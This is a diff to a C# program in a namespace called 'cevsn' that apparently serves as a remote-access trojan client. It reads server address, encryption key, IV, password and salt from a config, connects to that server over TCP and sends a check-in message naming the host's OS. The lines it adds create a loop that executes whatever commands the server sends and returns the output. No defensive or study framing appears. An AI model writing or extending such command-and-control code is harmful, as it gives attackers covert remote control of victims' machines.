@@ -1,3 +1,4 @@
+using System.Text;
 using System.Security.Cryptography;
 using System.Globalization;
 //imports for http get
@@ -22,6 +23,8 @@ namespace cevsn
         public volatile static String IP = "";
         public volatile static int PORT = 0;
         public volatile static string Type = "";
+        public volatile static string Pass = "";
+        public volatile static string Salt = "";
         public static readonly HttpClient client = new HttpClient();
         public volatile static Tevsn? tevsn = null;
         public volatile static Boolean IsConnected = false;
@@ -54,21 +57,31 @@ namespace cevsn
                         }
                         if(Type.Equals("TCP"))
                         {
-                            Console.Write("in tcp");
-                            tevsn = CreateTevsn(IP, PORT, KEY, IV);
+                            Console.Write("in tcp\n");
+                            tevsn = CreateTevsn(IP, PORT, KEY, IV, Pass, Salt);
+                            tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
                             if(tevsn.Connect())
                             {
-                                Console.Write("connected");
+                                Console.Write("connected\n");
                                 IsConnected = tevsn.IsConnected();
                                 while(IsConnected)
                                 {
                                     if(!first)
                                     {
-                                        tevsn.Send(UUID+ "just arrived to vacation on +" + getOsName());
+                                        Console.Write("Sending to Server first Conn!\n");
+                                        tevsn.Send(UUID + ": just arrived to vacation on: " + getOsName());
                                         tevsn.Receive();
                                         IsConnected = tevsn.IsConnected();
                                         first = true;
                                         Thread.Sleep(1000);
+                                    }
+                                    string recv = tevsn.Receive();
+                                    Console.Write(recv);
+                                    if(recv != "--")
+                                    {
+                                        tevsn.Send(tevsn.exec(recv));
+                                    } else {
+                                        tevsn.Send("keepalive");
                                     }
                                     Thread.Sleep(1000);
                                 }
@@ -123,13 +136,16 @@ namespace cevsn
                 Type = System.Text.Encoding.ASCII.GetString(typeTmp);
                 KEY = Convert.FromBase64String(lines[3]);
                 IV = Convert.FromBase64String(lines[4]);
+                Pass = lines[5];
+                byte[] saltTmp = Convert.FromBase64String(lines[6]);
+                Salt = System.Text.Encoding.ASCII.GetString(saltTmp);
                 gotHostInformation = true;
             }
         }
 
-        public static Tevsn CreateTevsn(string ip, int port, byte[] key, byte[] iv)
+        public static Tevsn CreateTevsn(string ip, int port, byte[] key, byte[] iv, string pass, string salt)
         {
-            return new Tevsn(ip, port, key, iv);
+            return new Tevsn(ip, port, key, iv, pass, salt);
         }
     }
 }
